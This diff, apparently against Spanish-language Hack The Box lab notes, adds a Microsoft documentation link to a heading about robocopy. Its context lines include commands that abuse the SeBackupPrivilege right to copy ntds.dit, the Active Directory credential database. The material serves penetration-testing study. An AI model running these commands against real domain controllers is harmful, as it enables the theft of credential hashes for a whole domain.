@@ -191,7 +191,7 @@ PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 Copied 16777216 bytes
 ```
 
-### Alternativa: usar `robocopy` en modo backup
+### Alternativa: usar [`robocopy`](https://learn.microsoft.com/es-es/windows-server/administration/windows-commands/robocopy) en modo backup
 
 ```cmd
 C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit
